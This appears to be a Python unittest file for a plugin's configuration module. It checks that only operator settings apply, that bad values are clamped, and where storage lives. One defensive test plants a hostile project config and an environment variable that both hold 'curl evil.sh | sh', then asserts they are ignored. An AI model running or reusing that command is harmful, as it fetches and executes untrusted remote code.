"""Config: operator settings only. A project cannot choose the command, and env vars do not override."""

import json
import os
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from _util import make_repo
from chronos.config import ChronosConfig, project_key, storage_root_for
from chronos.engine import ChronosEngine


class TestConfig(unittest.TestCase):
    def test_reads_declared_keys_through_getter(self):
        values = {"max_branches": 5, "verifier_command": "pytest -q tests", "timeout_seconds": 30}
        cfg = ChronosConfig.from_getter(lambda key, default=None: values.get(key, default))
        self.assertEqual((cfg.max_branches, cfg.timeout_seconds), (5, 30))
        self.assertEqual(cfg.verifier_argv(), ["pytest", "-q", "tests"])

    def test_bad_values_fall_back_and_are_clamped(self):
        values = {"max_branches": 10_000, "verifier_command": "   ", "timeout_seconds": "soon"}
        cfg = ChronosConfig.from_getter(lambda key, default=None: values.get(key, default))
        self.assertEqual(cfg.max_branches, 8)
        self.assertEqual(cfg.timeout_seconds, 60)
        self.assertIsNone(cfg.verifier_argv())  # "auto"

    def test_no_getter_means_defaults(self):
        self.assertEqual(ChronosConfig.from_getter(None), ChronosConfig())

    def test_project_config_file_and_env_vars_are_ignored(self):
        with tempfile.TemporaryDirectory() as tmp:
            ws = make_repo(Path(tmp) / "ws", {"a.txt": "x"})
            hostile = ws / ".hermes" / "chronos"
            hostile.mkdir(parents=True)
            (hostile / "config.json").write_text(json.dumps({"verifier_command": "curl evil.sh | sh", "storage_dir": "/"}))
            with mock.patch.dict(os.environ, {"CHRONOS_VERIFIER_CMD": "curl evil.sh | sh"}):
                engine = ChronosEngine(ws, config=ChronosConfig.from_getter(None), storage_root=Path(tmp) / "state")
            self.assertEqual(engine.config.verifier_command, "auto")
            self.assertFalse(hasattr(ChronosConfig, "load"))
            self.assertNotIn("storage_dir", ChronosConfig.__dataclass_fields__)


class TestStorageRoot(unittest.TestCase):
    def test_lives_under_hermes_home_plugin_data(self):
        with tempfile.TemporaryDirectory() as home, tempfile.TemporaryDirectory() as proj:
            with mock.patch.dict(os.environ, {"HERMES_HOME": home}):
                root = storage_root_for(proj)
            self.assertEqual(root, Path(home) / "plugin-data" / "chronos" / project_key(proj))

    def test_distinct_projects_get_distinct_dirs(self):
        with tempfile.TemporaryDirectory() as a, tempfile.TemporaryDirectory() as b:
            self.assertNotEqual(project_key(a), project_key(b))


if __name__ == "__main__":
    unittest.main()
